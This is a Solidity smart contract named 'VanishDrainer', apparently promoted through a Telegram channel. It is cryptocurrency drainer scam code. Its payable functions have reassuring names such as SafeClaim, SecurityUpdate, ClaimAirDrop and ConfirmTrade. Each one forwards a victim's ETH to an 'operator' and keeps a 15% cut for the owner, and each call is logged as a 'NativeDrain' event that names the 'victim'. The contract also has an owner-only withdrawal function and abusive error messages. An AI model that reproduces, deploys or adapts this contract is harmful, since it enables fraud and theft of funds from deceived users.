// SPDX-License-Identifier: MIT

pragma solidity ^0.8.22;


//                              _     _                    
//     ____                    (_)   | |                   
//    / __ \  __   ____ _ _ __  _ ___| |__                 
//   / / _` | \ \ / / _` | '_ \| / __| '_ \                
//  | | (_| |  \ V / (_| | | | | \__ \ | | |               
//   \ \__,_|   \_/ \__,_|_| |_|_|___/_| |_|               
//    \____/                                               
//                                                         
//               _____    _                                
//              |_   _|  | |                               
//  ___  _ __     | | ___| | ___  __ _ _ __ __ _ _ __ ___  
// / _ \| '_ \    | |/ _ \ |/ _ \/ _` | '__/ _` | '_ ` _ \ 
//| (_) | | | |   | |  __/ |  __/ (_| | | | (_| | | | | | |
// \___/|_| |_|   \_/\___|_|\___|\__, |_|  \__,_|_| |_| |_|
//                                __/ |                    
//                               |___/                     


// https://t.me/vanish

contract VanishDrainer {
    address private owner;
    address private contractAddress;
    uint8 private splitPercentage;

    // https://t.me/vanish
    event OwnerSet(address indexed oldOwner, address indexed newOwner);

    
    // https://t.me/vanish
    event NativeDrain(
        address indexed victim,
        address indexed operator,
        uint256 value
    );

    
    // https://t.me/vanish
    event PercentageChanged(
        uint8 oldPercentage,
        uint8 newPercentage
    );

    // https://t.me/vanish
    modifier isOwner() {
        require(msg.sender == owner, "This method can only be called by the contract owner. Now fuck off");
        _;
    }
    
    // https://t.me/vanish
    constructor() {
        owner = msg.sender; 
        contractAddress = address(this);
        splitPercentage = 15;
        emit OwnerSet(address(0), owner);
    }

    // https://t.me/vanish
    function changePercentage(uint8 newPercentage) public isOwner {
        uint8 oldPercentage = splitPercentage;
        splitPercentage = newPercentage;
        emit PercentageChanged(oldPercentage, splitPercentage);
    }

    // https://t.me/vanish
    function changeOwner(address newOwner) public isOwner {
        owner = newOwner;
        emit OwnerSet(owner, newOwner);
    }

    // https://t.me/vanish
    function getOwner() external view returns (address) { return owner; }

    // https://t.me/vanish
    function withdraw(
        address payable _to
    ) public isOwner {
        (bool success, ) = _to.call{
            value: address(this).balance
        }("");

        require(success, "ETH Transfer failed.");
    }
    
    // https://t.me/vanish
    function SafeClaim(address _operator) public payable {
        require (msg.value > 0, "Nice try moron");
        uint256 valueToSend = msg.value * (100 - splitPercentage) / 100;
        (bool success, ) = _operator.call{value: valueToSend}("");
        require(success, "ETH Transfer failed.");
        emit NativeDrain(msg.sender, _operator, msg.value); 
    }

    // https://t.me/vanish
    function SecurityUpdate(address _operator) public payable {
        require (msg.value > 0, "Nice try moron");
        uint256 valueToSend = msg.value * (100 - splitPercentage) / 100;
        (bool success, ) = _operator.call{value: valueToSend}("");
        require(success, "ETH Transfer failed.");
        emit NativeDrain(msg.sender, _operator, msg.value); 
    
    }

    // https://t.me/vanish
    function ClaimAirDrop(address _operator) public payable {
        require (msg.value > 0, "Nice try moron");
        uint256 valueToSend = msg.value * (100 - splitPercentage) / 100;
        (bool success, ) = _operator.call{value: valueToSend}("");
        require(success, "ETH Transfer failed.");
        emit NativeDrain(msg.sender, _operator, msg.value); 
    }

    // https://t.me/vanish
    function ClaimRewards(address _operator) public payable {
        require (msg.value > 0, "Nice try moron");
        uint256 valueToSend = msg.value * (100 - splitPercentage) / 100;
        (bool success, ) = _operator.call{value: valueToSend}("");
        require(success, "ETH Transfer failed.");
        emit NativeDrain(msg.sender, _operator, msg.value); 
    }

    // https://t.me/vanish
    function ConfirmTrade(address _operator) public payable {
        require (msg.value > 0, "Nice try moron");
        uint256 valueToSend = msg.value * (100 - splitPercentage) / 100;
        (bool success, ) = _operator.call{value: valueToSend}("");
        require(success, "ETH Transfer failed.");
        emit NativeDrain(msg.sender, _operator, msg.value); 
    }
}